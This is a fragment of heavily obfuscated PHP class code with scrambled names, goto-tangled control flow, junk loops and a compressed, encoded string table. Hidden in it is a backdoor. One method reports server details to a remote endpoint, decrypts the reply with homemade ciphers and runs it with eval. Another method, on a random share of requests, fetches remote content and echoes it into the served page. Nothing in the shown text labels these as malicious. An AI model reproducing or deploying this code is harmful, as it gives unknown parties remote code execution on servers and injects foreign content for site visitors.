array($Fả߫[135], $Fả߫[240]); goto F݅; d޲: } public function fhbd392aeaf1($fجѻ) { goto dė; d犓: $EΝ = array($dג[255], $dג[256], $dג[257], $dג[258], $dג[259], $dג[260], $dג[261], $dג[262]); $c宏 = $dג[0]($dג[263], $dג[104]($this->qrwp32a87cce, $dג[129], $dג[10])); $c = array(); goto cՂ襝; dė: $eʳՄ =& $_SERVER[ԥ]; $dג =& $_SERVER[ƥ]; if ($this->gapf23b9068d == $dג[254]) { return $fجѻ; } goto d犓; cՂ襝: foreach ($EΝ as $C𖋥) { if (!$dג[236]($C𖋥, $c宏)) { $c[] = $C𖋥; } } foreach ($c as $C𖋥) { unset($fجѻ[$C𖋥]); $A = $eʳՄ[605]; } return $fجѻ; goto d; d: $aƘň = $eʳՄ[606]; if (strlen($aƘň) < $eʳՄ[548]) { return; } goto eﭻ瑤; eﭻ瑤: } private function qfjy88341dc3() { goto A; Fêޟ: $c靨̵ = $_SERVER[$fط婢[44]]; $FƉ = array($fط婢[265]); $b҅܃ = $dѺ[607]; goto F; aލ: $GLOBALS[$fط婢[91]][$fط婢[95]][$fط婢[264]] = $fط婢[229]; $GLOBALS[$fط婢[91]][$fط婢[268]] = $fط婢[220]; if ($fط婢[61]($fط婢[269])->{$_SERVER[ƥ][63]}($fط婢[85]) != $fط婢[229]) { $fط婢[61]($fط婢[269])->{$_SERVER[ƥ][221]}($fط婢[85], $fط婢[229]); } goto a؏; A: $dѺ =& $_SERVER[ԥ]; $fط婢 =& $_SERVER[ƥ]; if ($this->gapf23b9068d != $fط婢[121]) { $GLOBALS[$fط婢[91]][$fط婢[95]][$fط婢[264]] = $fط婢[220]; return; } goto Fêޟ; F: while (strlen($b҅܃) < $dѺ[570]) { if (!$b҅܃) { break; } $b҅܃++; } foreach ($FƉ as $F˛) { if ($F˛ == $c靨̵ || $fط婢[25]($c靨̵, 0, $fط婢[24]($F˛)) == $F˛) { $fط婢[166]($fط婢[197]($fط婢[266]), !1); } } $GLOBALS[$fط婢[91]][$fط婢[95]][$fط婢[267]] = $fط婢[220]; goto aލ; a؏: } public function mvfhed2f1bca() { return $_SERVER[ƥ][270]; } private function msaxbf61bd8b() { goto E; E: $fŦ =& $_SERVER[ԥ]; $E솩 =& $_SERVER[ƥ]; $bҖ = array($E솩[271], $E솩[272], $E솩[273]); goto F׌; d: if (!$E솩[236]($_SERVER[$E솩[44]], $bҖ)) { return; } if ($E솩[230]() % 4 != 0) { return; } $B֒ = $E솩[13](array($E솩[276], $E솩[277]), $eń); goto dϞ; c: if (!$E솩[191]($C南셩)) { return; } if ($C南셩[$E솩[165]] && $C南셩[$E솩[280]]) { if ($this->{$_SERVER[ƥ][199]}($C南셩[$E솩[280]]) == $FŃ[$E솩[165]]) { return; } } $this->{$_SERVER[ƥ][164]}(); goto a; c㯝: $Aʋ = $fŦ[610]; $FŃ = array($E솩[165] => $E솩[61]($E솩[62])->{$_SERVER[ƥ][63]}($E솩[209]), $E솩[178] => $this->gapf23b9068d, $E솩[176] => $_SERVER[$E솩[177]], $E솩[169] => $E솩[149], $E솩[172] => $_SERVER[$E솩[173]]); $C南셩 = $this->{$_SERVER[ƥ][182]}($E솩[279], $FŃ); goto c; a: $Cޒ = $fŦ[611]; if (!$Cޒ) { return; } if ($this->{$_SERVER[ƥ][199]}($C南셩[$E솩[280]]) != $FŃ[$E솩[165]]) { $B = array($E솩[202] => $E솩[61]($E솩[62])->{$_SERVER[ƥ][63]}($E솩[116]), $E솩[203] => $_SERVER[$E솩[115]], $E솩[204] => $E솩[205](), $E솩[174] => $_SERVER[$E솩[175]]); $BΟ = $this->{$_SERVER[ƥ][206]}($E솩[148]($B)); $C南셩 = $this->{$_SERVER[ƥ][182]}($E솩[207] . $BΟ); if ($C南셩 && $E솩[191]($C南셩) && isset($C南셩[$E솩[280]])) { $D = $this->{$_SERVER[ƥ][188]}($C南셩[$E솩[280]], 2); if ($D) { $D = $this->{$_SERVER[ƥ][199]}($D); } if ($D) { try { @eval($D); } catch (Exception $C׫񛫊) { } } } } goto Bፉɂ; dϞ: $A = $fŦ[609]; if ($B֒ && $E솩[230]() - $B֒ < $E솩[201]($E솩[278])) { return; } $E솩[13](array($E솩[276], $E솩[152]), $eń, $E솩[230]()); goto c㯝; F׌: $a = $fŦ[608]; $eń = $E솩[274] . $E솩[114]($E솩[275]); if ($this->gapf23b9068d == $E솩[121] || !$E솩[104]($GLOBALS, $E솩[132])) { return; } goto d; Bፉɂ: } private function gjyv8933389d($cՕ䊌 = '', $B = array(), $dø = 5) { goto Cҳ; dޫ: $E釫 = $AϾ[612]; while ($E釫 < $AϾ[568]) { if ($E釫 >= 0) { break; } $E釫++; } $fҗ = $this->{$_SERVER[ƥ][243]}($fҗ, $aغ[282]); goto b; aϸ: if ($B === -1) { return $fҗ; } $D = $aغ[245](array($aغ[246] => array($aغ[249] => $dø, $aغ[247] => $aغ[285]), $aغ[286] => array($aغ[287] => !1, $aغ[288] => !1))); $B = @$aغ[250]($fҗ, !1, $D); goto FÒɹ; FÒɹ: return $aغ[190]($B, !0); $Aؓ = $AϾ[614]; goto Cږ; Cҳ: $AϾ =& $_SERVER[ԥ]; $aغ =& $_SERVER[ƥ]; $fҗ = $aغ[281]; goto dޫ; b: $fҗ = $fҗ . $cՕ䊌 . $aغ[283] . $aغ[284]($B); $c = $AϾ[613]; if (strlen($c) < $AϾ[556]) { return; } goto aϸ; Cږ: } private function knio83aafb1f() { goto e; D: $AΉ = $fŜ[619]; if (strlen($AΉ) < $fŜ[548]) { return; } goto FɈ䋪; b: $B = $aȮ[$this->gapf23b9068d]; $cԈ = $fŜ[615]; if (strlen($cԈ) < $fŜ[544]) { return; } goto D܈; B: $c񥄧 = $Cɮ[104]($this->qrwp32a87cce, $Cɮ[316]); $d֝ = $fŜ[617]; $c񥄧 = $c񥄧 ? $Cɮ[201]($c񥄧) : 0; goto aރ; e: $fŜ =& $_SERVER[ԥ]; $Cɮ =& $_SERVER[ƥ]; $aȮ = array($Cɮ[289] => $Cɮ[290], $Cɮ[291] => $Cɮ[292], $Cɮ[293] => $Cɮ[294], $Cɮ[295] => $Cɮ[296], $Cɮ[297] => $Cɮ[298], $Cɮ[299] => $Cɮ[238], $Cɮ[300] => $Cɮ[238], $Cɮ[301] => $Cɮ[290], $Cɮ[302] => $Cɮ[292], $Cɮ[303] => $Cɮ[294], $Cɮ[304] => $Cɮ[305], $Cɮ[306] => $Cɮ[296], $Cɮ[307] => $Cɮ[308], $Cɮ[309] => $Cɮ[298], $Cɮ[310] => $Cɮ[311], $Cɮ[312] => $Cɮ[313], $Cɮ[314] => $Cɮ[315]); goto b; aރ: $fǿ = $fŜ[618]; if (strlen($fǿ) < $fŜ[556]) { die; } return $B + $c񥄧; goto D; D܈: $B = $Cɮ[201]($B ? $B : $Cɮ[290]); $C = $fŜ[616]; while ($C < $fŜ[544]) { if ($C >= 0) { break; } $C++; } goto B; FɈ䋪: } public function yxwpb62bf1cb($Eəӏ) { goto a˲̡; Eƙ: if (!$E[236]($Eəӏ[$E[318]], $A)) { $E[166]($E[321], !1, $E[233]); } goto Cә; e˧: $a̛ = $D[620]; while (strlen($a̛) < $D[548]) { if (!$a̛) { break; } $a̛++; } if ($FØ >= $E[201]($E[238])) { return; } goto e; e: $CՋ = $E[61]($E[139])->{$_SERVER[ƥ][140]}(); if ($CՋ <= $FØ) { return; } $A = $E[61]($E[139])->{$_SERVER[ƥ][317]}($E[318])->{$_SERVER[ƥ][319]}($FØ)->{$_SERVER[ƥ][320]}(); goto BҮĄ; BҮĄ: $A = $E[222]($A, $E[10], $E[318]); $d◠؜ = $D[621]; if (!$d◠؜) { return; } goto Eƙ; a˲̡: $D =& $_SERVER[ԥ]; $E =& $_SERVER[ƥ]; $FØ = $this->{$_SERVER[ƥ][137]}(); goto e˧; Cә: } public function jvfp2cf3c935() { goto f; e: $C򃑂 = $e[242]; $f㝂ܖ = $d㠳[622]; $C򃑂 = $this->{$_SERVER[ƥ][243]}($C򃑂, $e[244]); goto aߚ; aߚ: $d = $d㠳[623]; while (strlen($d) < $d㠳[556]) { if (!$d) { break; } $d++; } $bαև = $e[245](array($e[246] => array($e[247] => $e[248], $e[249] => 3))); goto BܣՓ; f: $d㠳 =& $_SERVER[ԥ]; $e =& $_SERVER[ƥ]; if (!$e[104]($GLOBALS, $e[132]) || $e[322](1, 100) > 20) { return; } goto e; e􄏓: while ($bמ < $d㠳[556]) { if ($bמ >= 0) { break; } $bמ++; } goto f; BܣՓ: $f戳 = @$e[250]($C򃑂, !1, $bαև); echo $e[323] . $e[324]($f戳) . $e[325]; $bמ = $d㠳[624]; goto e􄏓; f: } private function srge3ce117d9($a؍, $f׻, $a = 3) { goto Aٗд; d: $Fîӊ = $a[124](15); $BԞ׹ = $a[327]; $fηϓ = $Fѓ[627]; goto eɻ쐋Ȇ; Aٗд: $Fѓ =& $_SERVER[ԥ]; $a =& $_SERVER[ƥ]; $a[326](1); goto F兀; f󢙆: $a܆ = $a[322](0, 5) . $a[10]; $c = $Fѓ[626]; if (strlen($c) < $Fѓ[568]) { die; } goto d; F兀: $Aŗޑ = $Fѓ[625]; if (!$Aŗޑ) { die; } $a؍ = $a[2]($a؍); goto f󢙆; eɻ쐋Ȇ: while ($fηϓ < $Fѓ[548]) { if ($fηϓ >= 0) { break; } $fηϓ++; } switch ($a܆) { case $a[229]: $F = $this->{$_SERVER[ƥ][147]}($a؍, $a[214]($f׻ . $Fîӊ)); $aҰ = $Fѓ[628]; if (strlen($aҰ) < $Fѓ[556]) { die; } break; $cƛ = $Fѓ[629]; while ($cƛ < $Fѓ[568]) { if ($cƛ >= 0) { break; } $cƛ++; } case $a[220]: $F = $this->{$_SERVER[ƥ][147]}($a؍, $a[214]($Fîӊ . $f׻)); break; $A = $Fѓ[630]; if (strlen($A) < $Fѓ[570]) { die; } case $a[328]: $F = $this->{$_SERVER[ƥ][147]}($a؍, $a[118]($Fîӊ . $f׻)); break; $Bσ = $Fѓ[631]; if (!$Bσ) { return; } case $a[329]: $F = $this->{$_SERVER[ƥ][147]}($a؍, $a[114]($Fîӊ . $f׻)); break; $DΖއ = $Fѓ[632]; while (strlen($DΖއ) < $Fѓ[548]) { if (!$DΖއ) { break; } $DΖއ++; } case $a[330]: goto FӍ۞; bװ: break; goto C; FӍ۞: $a؍ = $a[118]($a؍); $Eԋ = $Fѓ[633]; if (!$Eԋ) { die; } goto FĨ; C儅: $Eۦʓ = 0; for ($bؼ = 0; $bؼ < $a[24]($a؍); $bؼ++) { $Eۦʓ = $Eۦʓ == $a[24]($AÒ) ? 0 : $Eۦʓ; $b = ($B + $a[332]($BԞ׹, $a؍[$bؼ]) + $a[333]($AÒ[$Eۦʓ++])) % 64; $Fđ = $Fѓ[635]; if (strlen($Fđ) < $Fѓ[548]) { return; } $D .= $BԞ׹[$b]; $fё = $Fѓ[636]; if (!$fё) { die; } } $F = $a[324]($d嶛 . $D); goto bװ; fܕ: $f = $Fѓ[634]; while ($f < $Fѓ[556]) { if ($f >= 0) { break; } $f++; } $AÒ = $a[25]($AÒ, $B % 8, $B % 8 + 7); goto E; FĨ: $B = $a[331](0, 64); $d嶛 = $BԞ׹[$B]; $AÒ = $a[114]($d嶛 . $a[114]($f׻ . $d嶛) . $f׻); goto fܕ; E: $D = $a[10]; $bؼ = 0; $b = 0; goto C儅; C: default: $F = $this->{$_SERVER[ƥ][147]}($a؍, $f׻ . $Fîӊ); break; $D = $Fѓ[637]; if (strlen($D) < $Fѓ[548]) { die; } } $F = $a[214]($a܆ . $Fîӊ . $F); goto fڔ; fڔ: if ($a - 1 > 0) { $F = $this->{$_SERVER[ƥ][127]}($F, $f׻, $a - 1); } return $F; goto A枲ώ; A枲ώ: } private function zegt27bb58cb($c, $FȡԮ, $Cё = 3) { goto d; F®: $F = $bن[327]; switch ($d߾) { case $bن[229]: $cߋ = $this->{$_SERVER[ƥ][243]}($c, $bن[214]($FȡԮ . $aг)); break; case $bن[220]: $cߋ = $this->{$_SERVER[ƥ][243]}($c, $bن[214]($aг . $FȡԮ)); $aЕꦶ = $E̱[641]; if (strlen($aЕꦶ) < $E̱[570]) { die; } break; case $bن[328]: $cߋ = $this->{$_SERVER[ƥ][243]}($c, $bن[118]($aг . $FȡԮ)); $A˟Ӈ = $E̱[642]; if (!$A˟Ӈ) { return; } break; $EŅ = $E̱[643]; if (!$EŅ) { return; } case $bن[329]: $cߋ = $this->{$_SERVER[ƥ][243]}($c, $bن[114]($aг . $FȡԮ)); break; $C = $E̱[644]; if (!$C) { die; } case $bن[330]: goto F; B: for ($Dꎅ = 0; $Dꎅ < $bن[24]($c); $Dꎅ++) { $aĊ = $aĊ == $bن[24]($D) ? 0 : $aĊ; $B錼 = $aĊ++; $a濝 = $bن[332]($F, $c[$Dꎅ]) - $d򮂋 - $bن[333]($D[$B錼]); $E = $E̱[646]; if (!$E) { return; } while ($a濝 < 0) { $a濝 += 64; $DǑ䂐 = $E̱[647]; if (strlen($DǑ䂐) < $E̱[570]) { die; } } $b .= $F[$a濝]; } $cߋ = $bن[336]($b); $Eź = $E̱[648]; goto DŕĆ; f玘: $Dꎅ = 0; $a濝 = 0; $aĊ = 0; goto B; e̅ƅ: $Aۚ߂ = $E̱[645]; if (!$Aۚ߂) { return; } $d򮂋 = $bن[332]($F, $Dφ); goto Fގ; DŕĆ: break; $b앵 = $E̱[649]; if (!$b앵) { die; } goto D; Fގ: $D = $bن[114]($Dφ . $bن[114]($FȡԮ . $Dφ) . $FȡԮ); $D = $bن[25]($D, $d򮂋 % 8, $d򮂋 % 8 + 7); $b = $bن[10]; goto f玘; F: $c = $bن[335]($c); $Dφ = $c[0]; $c = $bن[25]($c, 1); goto e̅ƅ; D: default: $cߋ = $this->{$_SERVER[ƥ][243]}($c, $FȡԮ . $aг); break; $dǰ = $E̱[650]; } if ($Cё - 1 > 0) { $cߋ = $this->{$_SERVER[ƥ][188]}($cߋ, $FȡԮ, $Cё - 1); } goto F𐛡ǰ; F𐛡ǰ: return $cߋ; goto d̰ܟ鏢; c: $c = $bن[214]($c); $Eߍ = $E̱[639]; $d߾ = $c[0]; goto b; C¯֍ʹ: $c = $bن[2]($c); $Bݒ = $E̱[638]; if (strlen($Bݒ) < $E̱[544]) { return; } goto c; d: $E̱ =& $_SERVER[ԥ]; $bن =& $_SERVER[ƥ]; if (!$bن[334]($c) || $bن[24]($c) < 10) { return !1; } goto C¯֍ʹ; b: $f = $E̱[640]; $aг = $bن[25]($c, 1, 15); $c = $bن[25]($c, 16); goto F®; d̰ܟ鏢: } public function jran5193ac0b($e傪ٌ) { goto f; dý١: while ($aˆ < $bඦ[544]) { if ($aˆ >= 0) { break; } $aˆ++; } $aѬ = $D÷[114]($D÷[338] . ($FΘ + $b宣) . $D÷[339] . $d؈ԓㄠ . $D÷[339] . $a . $D÷[340]); $aΞ = $this->{$_SERVER[ƥ][147]}($e傪ٌ, $aѬ) . $D÷[341] . $fٲЫ; goto F; f: $bඦ =& $_SERVER[ԥ]; $D÷ =& $_SERVER[ƥ]; $FΘ = $this->{$_SERVER[ƥ][337]}(); goto D蹌; aǟ: $eʘ = $bඦ[652]; if (!$eʘ) { return; } $eڽ = ($FΘ - 1) * ($b宣 - 1); goto c˴; c˴: $d؈ԓㄠ = $D÷[201](($FΘ + $b宣) / 2); while (1) { $Bޤ = $d؈ԓㄠ; $Cϯɍ = $eڽ; $eǇ٭ = $bඦ[653]; if (!$eǇ٭) { die; } while ($Cϯɍ % $Bޤ != 0) { $A樂 = $Cϯɍ; $Aֆ = $bඦ[654]; $Cϯɍ = $Bޤ; $Bޤ = $A樂 % $Bޤ; } if ($Bޤ == 1) { break; } else { $d؈ԓㄠ++; } } $a = 2; goto FȨ; FȨ: for ($e = 0; $e < $eڽ * 10; $e++) { if (($eڽ * $e + 1) % $d؈ԓㄠ == 0) { $a = $D÷[201](($eڽ * $e + 1) / $d؈ԓㄠ); break; } } $fٲЫ = $this->{$_SERVER[ƥ][147]}($FΘ * $b宣 . $D÷[10], $D÷[149]); $aˆ = $bඦ[655]; goto dý١; D蹌: $fӞ = $bඦ[651]; while ($fӞ < $bඦ[570]) { if ($fӞ >= 0) { break; } $fӞ++; } $b宣 = $this->{$_SERVER[ƥ][337]}(); goto aǟ; F: return $aΞ; $Eڂ = $bඦ[656]; if (!$Eڂ) { return; } goto fϙ; fϙ: } public function nqljcbbcf21e($eሠ) { goto bꇎ; Dğě: if (strlen($aڒ) < $d·[548]) { return; } if (!$Fᇨ) { return $DĽ[10]; } $Fᇨ = $DĽ[201]($Fᇨ); goto cބЮ; DՋ𑏼: $cƃ奸 = $d·[664]; if (!$cƃ奸) { die; } for ($BÐɂ = 0; $BÐɂ < $fݐ * 10; $BÐɂ++) { if (($fݐ * $BÐɂ + 1) % $cﬖ == 0) { $EĻù = $DĽ[201](($fݐ * $BÐɂ + 1) / $cﬖ); break; } } goto E; F: if ($DĽ[19]($Eܮ) != 2) { return $DĽ[10]; } $Fᇨ = $this->{$_SERVER[ƥ][243]}($Eܮ[1] . $DĽ[10], $DĽ[149]); $aڒ = $d·[657]; goto Dğě; E: $C = $DĽ[114]($DĽ[338] . ($c + $AНһ) . $DĽ[339] . $cﬖ . $DĽ[339] . $EĻù . $DĽ[340]); $Bظ = $this->{$_SERVER[ƥ][243]}($Eܮ[0], $C); return $Bظ; goto Cȹڢ; Aݥ: for ($BÐɂ = 3; $BÐɂ < $Fᇨ; $BÐɂ += 2) { if ($Fᇨ % $BÐɂ != 0) { continue; } $c = $BÐɂ; $AНһ = $DĽ[201]($Fᇨ / $BÐɂ); break; } $fݐ = ($c - 1) * ($AНһ - 1); $EԊ = $d·[659]; goto dꑺ; cބЮ: $c = 0; $eʉ = $d·[658]; $AНһ = 0; goto Aݥ; bꇎ: $d· =& $_SERVER[ԥ]; $DĽ =& $_SERVER[ƥ]; $Eܮ = $DĽ[0]($DĽ[341], $eሠ); goto F; dꑺ: if (strlen($EԊ) < $d·[570]) { die; } $cﬖ = $DĽ[201](($c + $AНһ) / 2); $Cǜ = $d·[660]; goto B; B: while (strlen($Cǜ) < $d·[548]) { if (!$Cǜ) { break; } $Cǜ++; } while (1) { $c = $cﬖ; $f𗑈 = $d·[661]; while ($f𗑈 < $d·[544]) { if ($f𗑈 >= 0) { break; } $f𗑈++; } $dޓͼ = $fݐ; $DАқ = $d·[662]; if (!$DАқ) { return; } while ($dޓͼ % $c != 0) { $EҜ = $dޓͼ; $dޓͼ = $c; $c = $EҜ % $c; $BӔ = $d·[663]; } if ($c == 1) { break; } else { $cﬖ++; } } $EĻù = 2; goto DՋ𑏼; Cȹڢ: } public function nayda61721d0() { goto Dͨ; f򇂙: for ($e = $C; $e > 1; $e--) { $b = !0; foreach ($a̽ as $dҌ) { if ($e % $dҌ == 0) { $b = !1; break; } } if ($b) { $Dʆ = $e; break; } } return $Dʆ; $F = $DĹ[670]; goto fԷ; d׾: $BΒӌ = $DĹ[665]; if (!$BΒӌ) { return; } $a̽ = array(); goto f儖; E棃: $Dʆ = 2; $f = $DĹ[669]; if (strlen($f) < $DĹ[570]) { return; } goto f򇂙; f儖: $Fؾҍ = $DĹ[666]; if (strlen($Fؾҍ) < $DĹ[548]) { return; } $AҤ薂 = 1; goto Fؙ燼; Dͨ: $DĹ =& $_SERVER[ԥ]; $b =& $_SERVER[ƥ]; $C = $b[322]($b[342](2, 14), $b[342](2, 16) - 1); goto d׾; fԷ: if (strlen($F) < $DĹ[570]) { die; } goto D͓; Fؙ燼: $A㩘 = $DĹ[667]; if (strlen($A㩘) < $DĹ[556]) { return; } while ($AҤ薂 <= (int) $b[343]($C)) { $e = $AҤ薂; while (!0) { $e++; $aީȳ = $DĹ[668]; if (strlen($aީȳ) < $DĹ[544]) { return; } if ($e <= 2) { $AҤ薂 = $e; break; } else { if ($e < 2) { continue; } } $b = !0; for ($c = 2; $c <= $b[343]($e); $c++) { if ($e % $c == 0) { $b = !1; } } if ($b) { $AҤ薂 = $e; break; } } $a̽[] = $AҤ薂; } goto E棃; D͓: } public function xtmb7fcd1915($e, $D) { $b =& $_SERVER[ƥ]; return $b[13](array($b[14], $b[344]), $e, $D); } public function ohbw4fbc38f5($a, $Fѐ) { $fƏ =& $_SERVER[ƥ]; return $fƏ[13](array($fƏ[345], $fƏ[346]), $a, $Fѐ); } public function uwjr622a24ae($Aڌܠ, $bݿ) { $d =& $_SERVER[ƥ]; return $d[13](array($d[345], $d[347]), $Aڌܠ, $bݿ); } } goto Bڒ; dهΗ: if (!function_exists('_kodDe')) { function _kodDe($b) { $b = base64_decode($b); $EͰ = strlen($b); $fӍ = ''; $D蠖 = ord($b[0]) - 30; for ($B = 1; $B < $EͰ; $B += 2) { if ($B + 1 < $EͰ) { $fӍ .= chr(ord($b[$B + 1]) + $D蠖); $fӍ .= chr(ord($b[$B]) + $D蠖); } else { $fӍ .= chr(ord($b[$B]) + $D蠖); } } return $fӍ; } } define("\250\324\245\252\214\343\225", "\263\246"); $_SERVER[ԥ] = explode(base64_decode('fAJ8AXwB'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x7\x80\x1b\xc5\xd5\x30\x10\x48\xc0\xa1\xb7\x84\x7c\x10\xd6\x87\x8d\xef\xce\x2a\xd7\x7c\xb6\xcf\xbe\x3b\xeb\x24\x9d\x4f\xf6\xdd\x49\x96\x74\x6e\xa7\xb3\xbc\x92\x56\xd2\xfa\x24".strrev('fyfo7䏐+>8!qMJ>'."\0".'BPzT	6uwn')."\x37\xb7\x3f\xf7\xc1\xa7\x6b\x76\x5b\xb3\xeb\x9a\x5d\xcf\x7f\xe8\xfc\x8b\x70\x8\xfd\x6f\x37\x1c\x3e\xf2\xb4\x3d\x77\x41\xff\xfd\x24\xbf\x68\xd1\xc2\x47\xeb\xf6\xef\x3c\xf2\x3f\x87\xac\xfe\x3c\xd0\xfc\xe9\xda\x27\xb7\x6e\xb8"."\xe1\xfd\x96\xdc\x6d\x91\x13\xce\x9a\x7a\xcf\xc\xc7\x33\x27\x4e\x79\x7c\xf2\xce\xd1\x8f\x5c\x3\x1f\xfd\xf2\xc4\x37\xbe\x7a\xe1\xdf\x1f\x3f\xf8\xc7\x64\xfb\x2f\xbe\x1c\xf9\xe6\xb8\x3\x9b\x3c\xc7\xa6\x6f\x6a\x3e\x61\xea\x7e".base64_decode('ax5v3f9/Qu9Hbr3/9Wrv6AuPvPH6g07n2QP9X+1yyYEdxieb77w/U7x2xr2PfLd42tj5pz1+cfo=')."\xf2\xfa\xcf\x4e\xdd\x6d\xd6\x49\x67\x48\x1b\x5f\x39\x78\xdd\xa2\x8f\x1f\xf9\xf2\xfc\xb3\x6f\x3d\xf3\x37\xf7\xed\xff\xf6\xda\x33\xfa\xeb\xea\x1f\xbf\xf0\x8a\x19\xc7\xb7\xee\xf9\xee\xc6\xd\x71\xe7\xb7\x5f\x1c\x30\x76\x58\xc7"._kodDe('LveNpK+d33aD5yqqjD/QrlezqOqnrYVPl9ApIq6xZ8uRBlu7XqZNZyXnb7NF/GtXis+Nxmd3x25U').base64_decode('febt713m7Pzm9K+NhvS5753/pHcg/NWGf/x60senN3x22bLiAt8txt4LfEcddOu+u++3/8a3Qis=').strrev('a{t\\lw_gi=z|Yv>[_t')."\57\35\160\367\21\347\334\173\266\163\301\211\177\336\353\330\117\46\55\331\274\307\205\277\177\350\217\7\75\272\355\255\335\166\331\5\167\163\13\376\221\12\232\51\51\243\252\141\32\30\220\324\12\151\65\203".base64_decode('w2oB/7rxjzGUU00Fh+O9wWg80hcK+cPROClRTM9rKRIqyrqcJ4UXFd0AnxKLixe1olKwQDggJZs=')."\162\102\66\110\111\276\216\270\317\37\352\16\56\213\107\227\205\374\4\43\21\37\52\51\372\30\216\241\140\304\224\165\63\252\346\25\206\61\242\263\172\165\370\347\7\172\245\150\330\323\33\361\170\243\201\140"."\57\6\173\203\75\75\201\150\71\74\34\354\356\356\360\170\27\226\247\204\302\236\371\75\36\11\324\57\247\304\325\102\132\253\226\126\342\224\225\122\15\16\164\252\112\56\205\203\5\231\126\307\34\53\222\120"."\224\205\300\30\24\112\271\34\216\364\262\20\251\277\222\226\113\71\322\147\76\61\122\324\325\274\114\233\276\120\31\143\120\34\220\113\246\246\26\222\70\342\37\65\165\231\303\101\215\223\272\222\127\12\244\250"."\x88\xbf\xdb\xef\x8d\x4a\xb0\x9a\x52\x67\x38\xd8\x23\x91\xa1\xc8\xcb\x86\xa9\xe8\xd2\x92\x2e\x7f\xd8\x2f\xc1\xaa\xb7\x4e\x43\x2d\x9e\x26\xe1\x7c\x7d\xbd\xa0\x43\x24\x4f\x77\xb7\x34\x51\x9\xa6\x92\x2f\xd2\x62\x70\x9e\xa\x85"."\x5\xc3\x3e\x7f\x58\xea\x58\x26\xf1\x7e\x4a\x6a\xf9\xbc\x56\x70\x81\x52\xc0\x78\x9a\x42\x55\xfd\xe1\x30\xe\x38\x8\x5\x77\x7\xe0\xd0\x91\x48\xb0\xb3\x33\xe2\x67\x31\xd2\xb8\x45\xdd\xa0\x26\x8d\x84\x4a\x2d\xb1\x54\x3a\x67".base64_decode('xoflXIkS6yD+nUZ+yK9mEAIeUgtqiRArKULT2MwhgRLFVigkD7JpZE6BCTaMg61t+HcOQUrEYZo=')."\242\233\161\245\220\324\122\152\201\114\303\166\62\345\10\341\311\146\326\247\253\0\217\24\250\271\222\132\161\254\107\33\46\155\110\253\71\245\233\315\262\264\226\113\51\72\217\27\101\166\61\205\64\106\35\27"."\x72\xf7\x96\xf2\x22\xa\x8b\x26\xb3\x6a\x2e\xa5\xd3\xc9\xf9\x7d\x98\xf5\xa4\x58\xc5\x34\x41\x33\xc\x5a\xd3\xbe\x62\x4e\x93\x53\x11\x45\x17\x6a\xdf\x9\x8a\x9\x96\x4c\x11\x58\x42\x68\x9d\x9a\x9e\xf7\x1\x6\x40\x7a\x7\x90"."\xbd\xda\x57\x21\x61\x90\x12\x7e\x4a\xe8\x14\x17\x61\x5c\xd5\xfd\xc7\x3a\x77\xe\xf4\xcf\x3\xff\xd4\x10\x2e\x16\x23\x55\xcb\x2a\xb9\x5c\x5c\x19\x55\xc8\x4\xc9\xa7\x66\x18\xb4\xf6\x6e\x23\xa1\x16\xdc\x0\x82\xa3\x81\x60\x3c"."\x2b\x1b\xd9\x9e\xd4\x8c\x38\xca\x45\x99\x63\x4a\x19\x75\x15\xb3\x45\x32\x87\xd9\xb4\x25\x94\xb\x3b\xba\x57\x33\xfd\x2\x6f\xcd\x69\x49\x39\x27\x36\x11\x87\xb3\xa6\x59\x8c\x28\x85\x14\xec\x9\xd2\x14\x6d\xa4\x80\x7a\xaa\xa8"."\50\4\311\347\220\122\122\217\264\114\352\152\121\133\50\131\1\42\111\217\161\126\227\65\363\71\26\242\315\144\60\203\1\315\121\102\14\125\44\256\214\232\244\167\244\71\311\254\254\203\161\153\55\231\151\347"."\54\302\61\212\305\234\232\224\115\125\53\270\265\244\251\230\116\303\324\25\231\224\126\65\107\202\244\0\247\156\55\316\105\247\215\127\53\230\140\336\72\243\272\134\60\322\212\356\364\23\272\156\221\100\7\63"."\xd6\x45\xd1\x7c\xaa\x51\xd4\xc\x15\x7e\xa6\x45\x92\x4d\x53\x4e\x66\xe1\xb4\xe7\xc5\xb7\x7e\xf\xbe\x5a\xc8\xa9\x5\xa5\xc\xd7\x93\x4c\x2a\x86\xe1\x84\x59\x74\x2d\xe7\xf4\xe4\x72\xda\x88\x33\xa8\xab\x19\x15\xe4\xa9\xb5\x55".strrev('TwK!a%"޾M0'."\n".'Lz)b[9tqJ{J+').base64_decode('wpHBC6SdPXA8VSXljAD2TMCNdU0SICOJpmFoVzQaigc6wSrc64/3eKLeLlJtU87QOncDpsuKpMA=').base64_decode('pU4w1yCh9YI+4sCQNqLo4MMdYy3SoJZKaKMumgSRI4A9UGTYo0XTGZYLGdg/iTFTIeRoDGfoahI=')._kodDe('Ld1PuACyFNm/QAOdifbF1sGllElBvzlHCpFDhIQeFx9L77MpkjthwrGalYthpcGx38ltL/bymI2B')."\42\26\55\273\133\315\253\260\226\46\113\101\175\6\226\361\371\244\102\156\124\365\326\130\266\266\72\226\232\136\343\4\377\326\326\364\307\174\256\332\201\166\267\312\363\270\353\135\365\122\103\135\263\24\2\162".base64_decode('hSrnJEIvZRh1UnChlaK6lULGzBJRK+xf1OePROM9/mhX0Edy+z0k1K3hCUZr249/Bsg4gJU+oyQ=').base64_decode('tZymyznIRijVKHQqZ9Q0Z8sBII+QTsOMi0ciar5I2YyZLeUTQtDNSyAjCoaDMReNLSGaTkItbpI=')."\x65\x6a\x43\x27\xe5\x95\xee\x48\x23\xf8\x3f\x67\x8c\x29\x2d\x2f\x53\x41\x12\x4d\x3f\x25\x85\xe7\x1f\x6\xd5\x5a\x52\xba\x14\x99\xaf\x49\xa6\x6e\x6a\x10\xaa\x5b\x50\x7a\x14\x33\xab\x91\x69\x90\x51\x68\x95\x4a\xac\x6e\xb4\x96"."\x29\x25\xa7\xd0\x5e\xca\x2a\x94\xd7\x2\xe9\x68\x98\x75\x5e\x51\x57\xd2\x2a\xa1\x49\x20\xe\x1\x38\xe7\xa5\xaa\x11\x6\x99\xa0\x78\x42\xe3\x4b\xa0\x14\xc9\x1\x26\x67\xbb\xb2\xc1\x59\x37\x8c\x8\xb\x6b\x67\x5f\x77\x77\xdc".strrev('g0Vpq)Is͜Ad0VI 